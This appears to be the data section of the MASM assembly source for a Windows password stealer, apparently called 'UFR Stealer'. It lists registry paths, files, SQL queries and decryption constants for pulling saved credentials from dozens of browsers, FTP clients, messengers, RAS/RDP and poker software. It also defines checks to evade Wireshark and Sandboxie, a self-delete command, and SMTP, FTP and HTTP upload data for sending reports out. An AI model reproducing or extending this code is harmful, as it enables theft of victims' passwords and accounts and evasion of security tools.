      .686
      .model flat, stdcall
      option casemap:none
      
      WINVER equ 0501h
      
      include \masm32\include\nojmp\windows.inc
      include \masm32\include\nojmp\kernel32.inc
      include \masm32\include\nojmp\user32.inc
      include \masm32\include\nojmp\gdi32.inc
      include \masm32\include\nojmp\shell32.inc
      include \masm32\include\nojmp\shlwapi.inc
      include \masm32\include\nojmp\wininet.inc
      include \masm32\include\nojmp\ws2_32.inc
      include \masm32\include\nojmp\advapi32.inc
      include \masm32\include\nojmp\ntdll.inc
      include \masm32\include\nojmp\netapi32.inc
      include \masm32\include\nojmp\psapi.inc
      include \masm32\include\nojmp\ole32.inc
      include \masm32\include\nojmp\crypt32.inc
      include \masm32\include\nojmp\rasapi32.inc
      include \masm32\include\oaidl.inc
      include \masm32\macros\macros.asm
      include \masm32\macros\ucmacros.asm
      
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib
      includelib \masm32\lib\gdi32.lib
      
      prwsprintf TYPEDEF PROTO C :DWORD, :VARARG
      pwsprintf  TYPEDEF PTR prwsprintf
      EXTERNDEF _imp__wsprintfA:pwsprintf
      wsprintf TEXTEQU <_imp__wsprintfA>
      
      CALG_MD5                  equ 08003h
      
      REG_READ_A                equ 00h
      REG_READ_W                equ 01h
      REG_READ_W_W              equ 02h
      
      MAP_FILE_A                equ 00h
      MAP_FILE_W                equ 01h
      
      lodsbza MACRO ; load byte in EAX from ESI & increment ESI
        xor eax, eax
        lodsb
      ENDM
      lodswza MACRO ; load word in EAX from ESI & 2*increment ESI
        xor eax, eax
        lodsw
      ENDM
      

      map_file struct
          hFile                 dd  ?
          hMap                  dd  ?
          lpMem                 dd  ?
          dwFileSize            dd  ?
      map_file ends
      
      DATA_BLOB  struct
          cbSize                dd  ?
          pData                 dd  ?
      DATA_BLOB  ends
      
      SEH struct 
          SafeEip               dd  ?
          PrevEsp               dd  ?
          PrevEbp               dd  ?
      SEH ends

      Decrypt                   PROTO :DWORD, :DWORD, :DWORD
      strpos                    PROTO :DWORD, :DWORD, :DWORD, :DWORD
      strposU                   PROTO :DWORD, :DWORD, :DWORD, :DWORD
      WriteToLog                PROTO :DWORD, :DWORD
      UTF8toACP                 PROTO :DWORD, :DWORD
      MapFile                   PROTO :DWORD, :DWORD, :DWORD
      UnmapFile                 PROTO :DWORD
      Base64Encode              PROTO :DWORD, :DWORD, :DWORD
      Send_String               PROTO :DWORD
      RegRead                   PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD, :DWORD
      IsExeRunning              PROTO :DWORD
      GenHWIDString             PROTO
      HashMem                   PROTO :DWORD, :DWORD, :DWORD, :DWORD
      
.data

      DATA_START                db  00

; <No Import>
      psapi                     db  'psapi.dll',0
      func31                    db  'EnumProcesses',0
      func33                    db  'GetModuleFileNameExW',0
      
      shell32                   db  'shell32.dll',0
      func41                    db  'ShellExecuteA',0
      func42                    db  'SHGetSpecialFolderPathA',0
      func43                    db  'SHGetSpecialFolderPathW',0
      
      netapi32                  db  'netapi32.dll',0
      func51                    db  'NetUserEnum',0
      func52                    db  'NetApiBufferFree',0
      func53                    db  'Netbios',0
      
      wininet                   db  'wininet.dll',0
      func11                    db  'FtpSetCurrentDirectoryA',0
      func12                    db  'InternetOpenA',0
      func13                    db  'FtpPutFileA',0
      func14                    db  'FtpOpenFileA',0
      func15                    db  'InternetConnectA',0
      func16                    db  'InternetCloseHandle',0
      func17                    db  'FtpCreateDirectoryA',0
      func18                    db  'InternetOpenUrlA',0
      func19                    db  'InternetReadFile',0
      
      wsock32                   db  'ws2_32.dll',0
      func21                    db  'htons',0
      func22                    db  'inet_addr',0
      func23                    db  'gethostname',0
      func24                    db  'gethostbyname',0
      func25                    db  'connect',0
      func26                    db  'closesocket',0
      func27                    db  'WSAStartup',0
      func28                    db  'socket',0
      func29                    db  'send',0
      func210                   db  'inet_ntoa',0
      func211                   db  'recv',0
      
      advapi32                  db  'advapi32.dll',0
      func61                    db  'GetUserNameA',0
      func62                    db  'RegCloseKey',0
      func63                    db  'RegEnumKeyExA',0
      func631                   db  'RegEnumKeyExW',0
      func632                   db  'RegEnumValueA',0
      func64                    db  'RegEnumValueW',0
      func65                    db  'RegOpenKeyExA',0
      func651                   db  'RegOpenKeyExW',0
      func66                    db  'RegQueryValueExA',0
      func661                   db  'RegQueryValueExW',0
      func67                    db  'CredEnumerateW',0
      func68                    db  'CredFree',0
      func69                    db  'CryptAcquireContextA',0
      func610                   db  'CryptCreateHash',0
      func611                   db  'CryptDestroyHash',0
      func612                   db  'CryptGetHashParam',0
      func613                   db  'CryptHashData',0
      func614                   db  'CryptReleaseContext',0
      func615                   db  'CryptDestroyKey',0
      func616                   db  'CryptEncrypt',0
      func617                   db  'CryptExportKey',0
      func618                   db  'CryptGenKey',0
      func619                   db  'OpenProcessToken',0
      func620                   db  'GetUserNameW',0
      func621                   db  'CryptImportKey',0
      func622                   db  'CryptDecrypt',0
      func623                   db  'LookupAccountNameA',0
      func624                   db  'LsaRetrievePrivateData',0
      func625                   db  'LsaOpenPolicy',0
      func626                   db  'LsaFreeMemory',0
      func627                   db  'LsaClose',0
      func628                   db  'IsValidSid',0
      func629                   db  'ConvertSidToStringSidA',0
      func630                   db  'IsTextUnicode',0
      
      shlwapi                   db  'shlwapi.dll',0
      func71                    db  'PathMatchSpecA',0
      func72                    db  'PathFindFileNameA',0
      func76                    db  'PathFindFileNameW',0
      func73                    db  'PathFindExtensionA',0
      func74                    db  'StrToIntExA',0
      func78                    db  'StrToIntExW',0
      func75                    db  'PathAddBackslashA',0
      func77                    db  'PathAddBackslashW',0
      
      crypt32                   db  'crypt32.dll',0
      func81                    db  'CryptUnprotectData',0
      
      ole32                     db  'ole32.dll',0
      func91                    db  'CoUninitialize',0
      func92                    db  'CoInitialize',0
      func93                    db  'CoCreateInstance',0
      func94                    db  'CoTaskMemFree',0
      
      ntdll                     db  'ntdll.dll',0
      func101                   db  'RtlGetCompressionWorkSpaceSize',0
      func102                   db  'RtlCompressBuffer',0
      
      urlmon                    db  'urlmon.dll',0
      func111                   db  'URLDownloadToFileA',0
      
      rasapi32                  db  'rasapi32.dll',0
      func1000                  db  'RasGetEntryDialParamsA',0
      func1001                  db  'RasEnumEntriesA',0
      func1002                  db  'RasGetEntryPropertiesA',0
      
      krnl32                    db  'kernel32.dll',0
      gpifunc                   db  'GetProductInfo',0
      szIsWow64Process          db  'IsWow64Process',0
; </No Import>

; <Misc>
      szDrive                   db  'X:\',0
      szSysInfoUinstStr         db  'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',0
      lpSysInfoCPUInfoPath      db  'HARDWARE\DESCRIPTION\System\CentralProcessor\0',0
      lpSysInfoCPUInfoVal1      db  'ProcessorNameString',0
      lpSysInfoCPUInfoVal2      db  'Identifier',0
      lpSysWIDPath              db  'SOFTWARE\Microsoft\Windows NT\CurrentVersion',0
      lpSysWIDVal1              db  'ProductId',0
      lpSysWIDVal2              db  'DigitalProductId',0
      WSTR                      keychars,"BCDFGHJKMPQRTVWXY2346789"
      reg_val_displayname       db  'DisplayName',0
      reg_val_uninststring      db  'UninstallString',0
      user_agent                db  'Trololo',0
      whatismyip1               db  'http://whatismyip.akamai.com',0
      whatismyip2               db  'http://whatismyip.everdot.org/ip',0
      whatismyip3               db  'http://whatismyip.org',0
      sl                        db  '\',0 
      WSTR                      slW, "\"
      fake1                     db  '.',0 
      WSTR                      fake1W, "."
      WSTR                      fake2W, ".."
      fake2                     db  '..',0  
      strike                    db  '-',0
      crlf                      db  13,10,0
      crlfW                     db  13,0,10,0,0,0
      format_time               db  '%02hu-%02hu-%hu_%02hu-%02hu-%02hu',0
      FTP                       db  'FTP',0
      wildc                     db  '*',0
      MTX_NAME                  db  'UFR3',0
      format_str                db  '%lu',0
      nilstr                    db  0
      rsrc_info0                dd  0Ch
      bios_ver_path             db  'HARDWARE\DESCRIPTION\System',0
      bios_ver_name             db  'SystemBiosVersion',0
      tblBase64                 db  'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' ; NO ZERO AT THE END!
      format_winver             db  '%i.%i.%i',0
      format_scr_resol          db  '%ix%i',0
      format_hwid               db  '%08X%08X%08X%08X',0
      exe_search_shit           db  '.EXE'
; </Misc>

; <Gate Data>
      boundary                  db  'ABCDABCDABCD',0
      sh11                      db  '--',0
      sh12                      db  13,10,'Content-Disposition: form-data; name="myfile"; filename="',0
      sh13                      db  '"',13,10,'Content-Type: application/octet-stream',13,10,13,10,0
      sh14                      db  'POST ',0
      sh15                      db  ' HTTP/1.1',13,10,'Host: ',0
      sh16                      db  13,10,'Connection: close',13,10,'Content-Type: multipart/form-data; boundary=',0
      sh17                      db  13,10,'Content-Length: ',0
; </Gate Data>

; <Anti's Data>
      WiresharkWinText          db  'Wireshark'
      WiresharkWinClass         db  'gdkWindowToplevel',0
      ProcExpWndClass           db  'PROCEXPL',0
      ProcMonWndClass           db  'PROCMON_WINDOW_CLASS',0
      ;FileMonExeName            db  'FileMon.exe',0
      WSTR                      FileMonExeName,"FileMon.exe"
      ;RegMonExeName             db  'RegMon.exe',0
      WSTR                      RegMonExeName,"RegMon.exe"
      SbieDll                   db  'SbieDll.dll',0
; </Anti's Data>          

; <Dloader Data>
      exe_ext                   db  '.exe',0
; </Dloader Data>

; <Gate Data>
      gate_format_str1          db  '%s%s%s%s%s',0
      gate_format_str2          db  '%s%s%s%s%s%s%s%s%s%s%s',0
; <Gate Data>

; <SelfDelete Data>
      ComSpec                   db  'ComSpec',0
      prm1                      db  '/c del ',22h,0
      prm2                      db  22h,' >> NUL',0
; </SelfDelete Data>

; <Mail Data>
      szEHLO                    db  'EHLO server',13,10,0
      szAUTHLOGIN               db  'AUTH LOGIN',13,10,0
      szMAILFROM                db  'MAIL FROM:<',0
      szRCPTTO                  db  'RCPT TO:<',0
      szSKOBKA                  db  '>',13,10,0
      szDATA                    db  'DATA',13,10,0
      szSubject                 db  'Subject: ',0
      szEnd                     db  13,10,'.',13,10,0
      szQuit                    db  'QUIT',13,10,0
      a1                        db  'Content-Type: application/octet-stream; name="%s"',13,10
                                db  'Content-Disposition: attachment; filename="%s"',13,10
                                db  'Content-Transfer-Encoding: base64',13,10,0
      szsubj                    db  'UFR Stealer Report [ %s ]',0
; </Mail Data>

; <Stealer Data>
      report1                   db  'report_',0
      report2                   db  '.bin',0
      emtpy_bin_file_no_pwd     db  'NO_PWDS_',0
; </Stealer Data>

; <Stealers>
      ; Chrome
      chrome_file1              db  'Login Data',0
      chrome_file2              db  'Web Data',0
      chrome_mark               db  01h,01h,04h,01h,01h
      chrome_mark2              db  01h,01h,01h,01h,01h
      ; FAR
      FarPath1                  db  'Software\Far\Plugins\FTP\Hosts',0
      FarPath2                  db  'Software\Far18\Plugins\FTP\Hosts',0
      FarPath3                  db  'Software\Far2\Plugins\FTP\Hosts',0
      FarReg2                   db  'HostName',0
      FarReg3                   db  'Password',0
      FarReg4                   db  'User',0
      Far3Path1                 db  'Far Manager',0
      far3_netbox_fn            db  '42E4AEB1-A230-44F4-B33C-F195BB654931.db',0
      ; FileZilla  
      fz_file1                  db  'recentservers.xml',0
      fz_file2                  db  'sitemanager.xml',0
      filezilla_path            db  'FileZilla',0
      fzserver1                 db  '<Server>',0
      fzserver2                 db  '</Server>',0
      fzserver3                 db  '<Host>',0
      fzserver4                 db  '</Host>',0
      fzserver5                 db  '<User>',0
      fzserver6                 db  '</User>',0
      fzserver7                 db  '<Pass>',0
      fzserver8                 db  '</Pass>',0
      ; FireFox
      ff_str_1                  db  'Software\Mozilla\Mozilla Firefox',0
      ff_str_2                  db  'CurrentVersion',0
      ff_str_3                  db  'Install Directory',0
      ff_str_4                  db  '\Mozilla\Firefox\Profiles\',0
      ff_mask_1                 db  '%s\%s\Main',0
      ff_mask_2                 db  '%s%s\signons.sqlite',0
      sql_statement             db  'SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins',0
      ff_lib8                   db  'nss3.dll',0
      ff_lib9                   db  'sqlite3.dll',0
      ff_lib10                  db  'mozsqlite3.dll',0
      ff_func1                  db  'NSS_Init',0
      ff_func3                  db  'PK11_GetInternalKeySlot',0
      ff_func4                  db  'PK11_Authenticate',0
      ff_func5                  db  'PK11SDR_Decrypt',0
      ff_func6                  db  'NSS_Shutdown',0
      ff_func7                  db  'PK11_FreeSlot',0
      ff_func8                  db  'NSSBase64_DecodeBuffer', 0
      ff_sql_open               db  'sqlite3_open16',0
      ff_sql_exec               db  'sqlite3_exec',0
      ff_sql_close              db  'sqlite3_close',0
      ; Thunderbird (Mozilla-based)
      tb_str_1                  db  'SOFTWARE\Mozilla\Mozilla Thunderbird',0
      tb_str_4                  db  '\Thunderbird\Profiles\',0
      ; SeaMonkey (Mozilla-based)
      sm_str_1                  db  'SOFTWARE\Mozilla\SeaMonkey',0
      sm_str_4                  db  '\Mozilla\SeaMonkey\Profiles\',0
      ; FlashFXP
      oxie                      db  '0x',0
      WSTR                      oxieW,"0x"
      fxp_regpath1              db  'SOFTWARE\FlashFXP',0
      fxp_pwd_file1             db  'quick.dat',0
      fxp_pwd_file2             db  'Sites.dat',0
      FXPIniStr1                db  'IP',0
      FXPIniStr2                db  'user',0
      FXPIniStr3                db  'pass',0
      FXPIniStr4                db  'created',0
      fxp_key_sites             db  'yA36zA48dEhfrvghGRg57h5UlDv3',0
      fxpnilstr                 db  0
      ; GTalk
      GtalkReg1                 db  'Software\Google\Google Talk\Accounts',0
      GtalkReg2                 db  'pw',0
      GEntropyData              db  0A3h,01Eh,0F3h,069h,007h,062h,0D9h,01Fh,01Eh,0E9h,035h,07Dh,04Fh,0D2h,07Dh,048h
      Gobase                    dd  0BA0DA71Dh
      EntropyData               db  10h dup (0)
      obase                     dd  0
      ; ICQ
      uStoredPassword           db  'S',0,'t',0,'o',0,'r',0,'e',0,'d',0,'P',0,'a',0,'s',0,'s',0,'w',0,'o',0,'r',0,'d',0,0,0
      icq_str1                  db  'ICQ\',0
      icq_smask1                db  '%s%s\Owner.qdb',0
      icq_smask2                db  '%s%s\Owner.mdb',0
      icq8_str1                 db  'ICQ-Profile\Update\ver.txt',0
      icq8_reg2                 db  'Software\ICQ\ICQ\magent_logins3',0
      WSTR                      icq_exe,"icq.exe"
      ; IE6
      szPSDLLName               db  'pstorec.dll',0
      szPSFuncName              db  'PStoreCreateInstance',0
      szPExplorer               db  'internet explorer',0
      ; IE7
      ie_regpath1               db  'Software\Microsoft\Internet Explorer\IntelliForms\Storage2',0
      CLSID_CUrlHistory         db  40h, 4Ah, 37h, 3Ch, 0E4h, 0BAh, 0CFh, 11h, 0BFh, 7Dh, 00h, 0AAh, 00h, 69h, 46h, 0EEh
      IID_IUrlHistoryStg2       db  11h, 0DCh, 0A0h, 0AFh, 13h, 0C3h, 0D0h, 11h, 83h, 1Ah, 00h, 0C0h, 4Fh, 0D5h, 0AEh, 38h
      zv                        db  '?',0
      IEformat_str              db  '%02X',0
      ; Live
      WSTR                      mask1,"WindowsLive:name=*"
      ; Miranda
      miranda_str_1             db  '\Miranda\',0
      miranda_smask             db  '%s%s\%s.dat',0
      miranda_smask2            db  '%lu',0
      dwords_3                  db  "AM_BaseProto"
      miranda_pwd1              db  'Password',0
      miranda_yahoo_login       db  'yahoo_id',0
      miranda_jabber_login      db  'LoginName',0
      miranda_jabber_server     db  'LoginServer',0
      miranda_jabber_pwd        db  'LoginPassword',0
      miranda_uin1              db  'UIN',0
      miranda_aim_login         db  'SN',0
      miranda_email1            db  'e-mail',0
      miranda_servername1       db  'ServerName',0
      miranda_nick1             db  'Nick',0
      ; MRA
      mra_str1                  db  'Mra\Update\ver.txt',0
      align 4
      WSTR                      mra_reg2,"Software\Mail.Ru\Agent\magent_logins3"
      align 4
      WSTR                      mra_reg3,"####password"
      align 4
      WSTR                      mra_exe,"magent.exe"
      ; Opera
      OperaPath1                db  'Opera\Opera\wand.dat',0
      OperaPath1_2              db  'Opera\Opera x64\wand.dat',0
      OperaPath2                db  'profile\wand.dat',0
      OperaReg1                 db  'Software\Opera Software',0
      OperaReg2                 db  'Last Directory3',0
      OperaReg3                 db  'Last Install Path',0 ; Last Install, motherfucker!
      OperaReg4                 db  'Last Install Path x64',0 ; Last Install x64, motherfucker!; 
      ; Pidgin
      pidgin_path               db  '.purple\accounts.xml',0
      pidginserver1             db  '<account>',0
      pidginserver2             db  '</account>',0
      pidginserver3             db  '<protocol>',0
      pidginserver4             db  '</protocol>',0
      pidginserver5             db  '<name>',0
      pidginserver6             db  '</name>',0
      pidginserver7             db  '<password>',0
      pidginserver8             db  '</password>',0
      ; QIP Infium
      infium_smask              db  '%s%s\%s.qip',0
      words_3                   db  02h,00h,00h,00h,03h,00h
      infium_str_1              db  '\QIP\Profiles\',0
      q_inf_uninstall           db  'Software\Microsoft\Windows\CurrentVersion\Uninstall\QIP Infium',0
      q_inf_install_loc         db  'InstallLocation',0
      q_inf_users               db  'Profiles\*',0
      ; QIP 2005
      q2005_uninstall           db  'Software\Microsoft\Windows\CurrentVersion\Uninstall\QIP 2005',0
      q2005_install_loc         db  'InstallLocation',0
      q2005_users               db  'Users\*',0
      q2005_smask               db  '%s%s\Config.ini',0
      q2005_sect_name           db  'Main',0
      q2005_key_name            db  'Custom2',0
      ; SmartFTP
      smart_path1               db  'SmartFTP',0
      smartserver1              db  '<Name>',0
      smartserver2              db  '</Name>',0
      smartserver3              db  '<Host>',0
      smartserver4              db  '</Host>',0
      smartserver5              db  '<User>',0
      smartserver6              db  '</User>',0
      smartserver7              db  '<Password>',0
      smartserver8              db  '</Password>',0
      ; The Bat
      TheBat_str_1              db  'The Bat!\',0
      TheBat_str_2              db  'BatMail\',0
      TheBat_file1              db  'Account.cfn',0
      TheBat_reg1               db  'SOFTWARE\RIT\The Bat!',0
      TheBat_regval1            db  'Working Directory',0
      ; WTC
      wtc_path                  db  'Software\Ghisler\Total Commander',0
      wtc_path1                 db  'Ghisler',0
      wtc_file1                 db  'wcx_ftp.ini',0
      wtc_val                   db  'FtpIniName',0
      wtc_val2                  db  'InstallDir',0
      WTCIniStr1                db  'host',0
      WTCIniStr2                db  'username',0
      WTCIniStr3                db  'password',0
      percent                   db  '%',0
      ; Safari
      safari_path1              db  'Apple Computer\Preferences\keychain.plist',0
      safari_path2              db  'Safari\Apple Application Support\plutil.exe',0
      safari_exec_cmd           db  'plutil.exe -convert xml1 -s -o "%s" "%s"',0
      safari_tmp_xml            db  'keychain_safari.xml',0
      safari_dict1              db  0Ah,09h,09h,'<dict>'
      safari_dict2              db  0Ah,09h,09h,'</dict>'
      safari_acc1               db  0Ah,09h,09h,09h,'<key>Account</key>',0Ah,09h,09h,09h,'<string>'
      safari_acc2               db  '</string>'    
      safari_kdata1             db  0Ah,09h,09h,09h,'<key>Data</key>',0Ah,09h,09h,09h,'<data>',0Ah,09h,09h,09h
      safari_kdata2             db  0Ah,09h,09h,09h,'</data>'
      safari_serv1              db  0Ah,09h,09h,09h,'<key>Server</key>',0Ah,09h,09h,09h,'<string>'
      safari_serv2              db  '</string>'
      safari_salt               db  01Dh, 0ACh, 0A8h, 0F8h, 0D3h, 0B8h, 048h, 03Eh, 048h, 07Dh, 03Eh, 00Ah, 062h, 007h, 0DDh, 026h
                                db  0E6h, 067h, 081h, 003h, 0E7h, 0B2h, 013h, 0A5h, 0B0h, 079h, 0EEh, 04Fh, 00Fh, 041h, 015h, 0EDh
                                db  07Bh, 014h, 08Ch, 0E5h, 04Bh, 046h, 00Dh, 0C1h, 08Eh, 0FEh, 0D6h, 0E7h, 027h, 075h, 006h, 08Bh
                                db  049h, 000h, 0DCh, 00Fh, 030h, 0A0h, 09Eh, 0FDh, 009h, 085h, 0F1h, 0C8h, 0AAh, 075h, 0C1h, 008h
                                db  005h, 079h, 001h, 0E2h, 097h, 0D8h, 0AFh, 080h, 038h, 060h, 00Bh, 071h, 00Eh, 068h, 053h, 077h
                                db  02Fh, 00Fh, 061h, 0F6h, 01Dh, 08Eh, 08Fh, 05Ch, 0B2h, 03Dh, 021h, 074h, 040h, 04Bh, 0B5h, 006h
                                db  06Eh, 0ABh, 07Ah, 0BDh, 08Bh, 0A9h, 07Eh, 032h, 08Fh, 06Eh, 006h, 024h, 0D9h, 029h, 0A4h, 0A5h
                                db  0BEh, 026h, 023h, 0FDh, 0EEh, 0F1h, 04Ch, 00Fh, 074h, 05Eh, 058h, 0FBh, 091h, 074h, 0EFh, 091h
                                db  063h, 06Fh, 06Dh, 02Eh, 061h, 070h, 070h, 06Ch, 065h, 02Eh, 053h, 061h, 066h, 061h, 072h, 069h
      ; Psi
      WSTR                      psi_path1,"PsiData\profiles\*"
      WSTR                      psi_path2,"Psi\profiles\*"
      WSTR                      psi_mask_1,"%s%s\accounts.xml"
      psi_mask_21               db  0Ah,20h,20h,'<a%i>',0
      psi_mask_22               db  0Ah,20h,20h,'</a%i>',0
      psi_jid1                  db  0Ah,20h,20h,20h,'<jid type="QString">'
      psi_jid2                  db  '</jid>'
      psi_pwd1                  db  0Ah,20h,20h,20h,'<password type="QString">'
      psi_pwd2                  db  '</password>'
      ; World Of Tanks
      ;wot_path1                 db  'Wargaming.net\WorldOfTanks\preferences.xml',0
      ;wot_sector1               db  '<loginInfo>'
      ;wot_sector2               db  '</loginInfo>'
      ;wot_user1                 db  '<user>'
      ;wot_user2                 db  '</user>'
      ;wot_pwd1                  db  '<password>'
      ;wot_pwd2                  db  '</password>'
      ; CoreFTP
      coreftp_path1             db  'Software\FTPWare\CoreFTP\Sites',0
      WSTR                      coreftpReg1,"Host"
      WSTR                      coreftpReg2,"User"
      WSTR                      coreftpReg3,"PW"
      ; WS_FTP
      wsftp_path1               db  'Ipswitch\WS_FTP',0
      wsftp_filename1           db  'ws_ftp.ini',0
      wsftp_str1                db  'HOST',0
      wsftp_str2                db  'UID',0
      wsftp_str3                db  'PWD',0
      ; RAS
      LsaKeyName1               db  'RasDialParams!',0
      LsaKeyName2               db  'L$_RasDefaultCredentials#0',0
      LsaKeyName3               db  'DialParamsUID',0
      LsaEnd                    db  '#0',0
      pbkstr                    db  'Microsoft\Network\Connections\pbk\rasphone.pbk',0
      ; RDP
      WSTR                      rdpmask1,"TERMSRV/*"
      rdpmask2                  db  '*.rdp',0
      WSTR                      rdp_str1,"51:b:"
      WSTR                      rdp_str2,"username:s:"
      WSTR                      rdp_str3,"full address:s:"
      ; Bitcoins
      ;bc_path1                  db  'Bitcoin\wallet.dat',0
      ; WebDrive
      ;webdrive_path1            db  'Software\South River Technologies\WebDrive\Connections',0
      ;webdrive_reg1             db  'Url',0
      ;webdrive_reg2             db  'UserName',0
      ;webdrive_reg3             db  'PassWord',0
      ; IncrediMail
      im_regaddr                db  'Software\IncrediMail\Identities',0
      im_regaddr2               db  '\Accounts',0
      WSTR                      im_acc1,"EmailAddress"
      WSTR                      im_acc2,"PopAccount"
      WSTR                      im_acc3,"PopServer"
      WSTR                      im_acc4,"PopPassword"
      WSTR                      im_acc5,"SmtpAccount"
      WSTR                      im_acc6,"SmtpServer"
      WSTR                      im_acc7,"SmtpPassword"
      ; PokerStars
      ps_path1                  db  'PokerStars\user.ini',0
      ps_path2                  db  'user.ini',0
      ps_ini_razdel             db  'User',0
      ps_ini_login              db  'Name',0
      ps_ini_pwd                db  'PWD',0
      ps_reg_path1              db  'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\PokerStars',0
      ps_reg_val1               db  'UninstallString',0
      ps_reg_path2              db  'Software\VB and VBA Program Settings\Plugin',0
      ps_sysinfo_val1           db  'InstanceA',0
      ps_sysinfo_val2           db  'InstanceB',0
      ; FullTiltPoker
      futp_reg_path1            db  'Software\Full Tilt Poker\UserInfo',0
      futp_reg_val1             db  'Password',0
      futp_reg_val2             db  'Username',0
      futp_reg_check            db  'FULL TILT POKER',0
      ; WinSCP
      scp_regpath1              db  'Software\Martin Prikryl',0
      scp_regpath2              db  '\Sessions',0
      scp_reg2                  db  'HostName',0
      scp_reg3                  db  'UserName',0
      scp_reg4                  db  'Password',0
      
      
; </Stealers>

      DATA_END                  db  0
      
.data?
      hwininet                  dd  ?
      _FtpSetCurrentDirectory   dd  ?
      _InternetOpen             dd  ?
      _FtpPutFile               dd  ?
      _FtpOpenFile              dd  ?
      _InternetConnect          dd  ?
      _InternetCloseHandle      dd  ?
      _FtpCreateDirectory       dd  ?
      _InternetOpenUrl          dd  ?
      _InternetReadFile         dd  ?
      hwsock32                  dd  ?
      _htons                    dd  ?
      _inet_addr                dd  ?
      _gethostname              dd  ?
      _gethostbyname            dd  ?
      _connect                  dd  ?
      _closesocket              dd  ?
      _WSAStartup               dd  ?
      _socket                   dd  ?
      _send                     dd  ?
      _inet_ntoa                dd  ?
      _recv                     dd  ?
      hpsapi                    dd  ?
      _EnumProcesses            dd  ?
      _GetModuleFileNameExW     dd  ?
      hshell                    dd  ?
      _ShellExecute             dd  ?
      _SHGetSpecialFolderPath   dd  ?
      _SHGetSpecialFolderPathW  dd  ?
      hnetapi32                 dd  ?
      _NetUserEnum              dd  ?
      _NetApiBufferFree         dd  ?
      _Netbios                  dd  ?
      hadvapi32                 dd  ?
      _GetUserName              dd  ?
      _GetUserNameW             dd  ?
      _RegCloseKey              dd  ?
      _RegEnumKeyEx             dd  ?
      _RegEnumKeyExW            dd  ?
      _RegEnumValueA            dd  ?
      _RegEnumValueW            dd  ?
      _RegOpenKeyEx             dd  ?
      _RegOpenKeyExW            dd  ?
      _RegQueryValueEx          dd  ?
      _RegQueryValueExW         dd  ?
      _CredEnumerateW           dd  ?
      _CredFree                 dd  ?
      _CryptAcquireContext      dd  ?
      _CryptCreateHash          dd  ?
      _CryptDestroyHash         dd  ?
      _CryptGetHashParam        dd  ?
      _CryptHashData            dd  ?
      _CryptReleaseContext      dd  ?
      _CryptDestroyKey          dd  ?
      _CryptEncrypt             dd  ?
      _CryptExportKey           dd  ?
      _CryptGenKey              dd  ?
      _OpenProcessToken         dd  ?
      _CryptImportKey           dd  ?
      _CryptDecrypt             dd  ?
      _LookupAccountName        dd  ?
      _LsaRetrievePrivateData   dd  ?
      _LsaOpenPolicy            dd  ?
      _LsaFreeMemory            dd  ?
      _LsaClose                 dd  ?
      _IsValidSid               dd  ?
      _ConvertSidToStringSid    dd  ?
      _IsTextUnicode            dd  ?
      hshlwapi                  dd  ?
      _PathMatchSpec            dd  ?
      _PathFindFileName         dd  ?
      _PathFindFileNameW        dd  ?
      _PathFindExtension        dd  ?
      _StrToIntEx               dd  ?
      _StrToIntExW              dd  ?
      _PathAddBackslash         dd  ?
      _PathAddBackslashW        dd  ?
      hcrypt32                  dd  ?
      _CryptUnprotectData       dd  ?
      hole32                    dd  ?
      _CoUninitialize           dd  ?
      _CoInitialize             dd  ?
      _CoCreateInstance         dd  ?
      _CoTaskMemFree            dd  ?
      hntdll                    dd  ?
      _RtlGetCompressionWorkSpaceSize   dd  ?
      _RtlCompressBuffer        dd  ?
      hurlmon                   dd  ?
      _URLDownloadToFile        dd  ?
      hrasapi32                 dd  ?
      _RasGetEntryDialParams    dd  ?
      _RasEnumEntries           dd  ?
      _RasGetEntryProperties    dd  ?
      
      align 4
      saddr                     sockaddr_in <>
      wsad1                     WSADATA <>
      align 4
      KEY                       db  10h   dup (?)
      FTP_HOST                  db  100h  dup (?)
      FTP_LOGIN                 db  100h  dup (?)
      FTP_PWD                   db  100h  dup (?)
      P_MODE                    db  ?
      align 4
      mail_port                 dw  ?
      align 4
      mail_from                 db  100h  dup (?)
      mail_to                   db  100h  dup (?)
      mail_login                db  100h  dup (?)
      mail_pwd                  db  40h   dup (?)
      mail_server               db  100h  dup (?)
      mail_buf0                 db  200h  dup (?)
      mail_buf                  db  200h  dup (?)
      mail_buf2                 db  200h  dup (?)
      base64log                 db  200h  dup (?)
      base64pass                db  200h  dup (?)
      align 4
      FileNameBuf               db  1000h dup (?)
      SubHeader1                db  1000h dup (?)
      SubHeader2                db  1000h dup (?)
      HTTPHeader                db  1000h dup (?)
      readbuf                   db  1000h dup (?)
      DropPath                  db  1000h dup (?)
      RemPath                   db  1000h dup (?)
      cmdl                      db  1000h dup (?)
      cmdpath                   db  1000h dup (?)
      cmdprm                    db  1000h dup (?)
      buf                       db  1000h dup (?)
      cpyfrom                   db  1000h dup (?)
      cpyto                     db  1000h dup (?) 
      cpyt2                     db  1000h dup (?)    
      const_d                   db  1000h dup (?) 
      cur_d                     db  1000h dup (?) 
      TmpBuf                    db  1000h dup (?)
      TmpBuf2                   db  1000h dup (?)
      TmpBuf3                   db  1000h dup (?)
      TmpBuf4                   db  1000h dup (?)
      TmpBuf5                   db  1000h dup (?)
      win_cd_key                db  100h  dup (?)
      SoftListBuf1              db  400h  dup (?)
      SoftListBuf2              db  400h  dup (?)
      ProcNameConst             db  100h  dup (?)
      UniqDirName               db  100h  dup (?)
      ext                       db  100h  dup (?)
      nmb                       db  10h   dup (?)
      cd_key_tmp_buf            db  10h   dup (?)
      ; Get HWID for report's name
      ComputerHWID              db  100h  dup (?)
      hwidbuf                   db  100h  dup (?)
      ; kill processes for MRA & ICQ8
      lpKillFilename            dd  800h  dup (?)
      pProcessIds               dd  1000h dup (?)
      ; IMPORTANT REC FUNC SHIT
      recursive_index           dd  ?
      
      align 4
      hlist                     dd  ?
      hdisplist                 dd  ?
      mfile                     map_file <>
      hFile                     dd  ?
      nSize                     dd  ?
      BufLen                    dd  ?
      hkHandle                  dd  ?
      hkHandle2                 dd  ?
      hHeap                     dd  ?
      fc                        dd  ?
      t_hndl                    dd  ?
      cnt                       dd  ?
      tID                       dd  ?
      
      ; 3
      DirHide                   db  ?  ; Directory Hide   (0/1)
      SelfDel                   db  ?  ; SelfDel or not   (0/1)
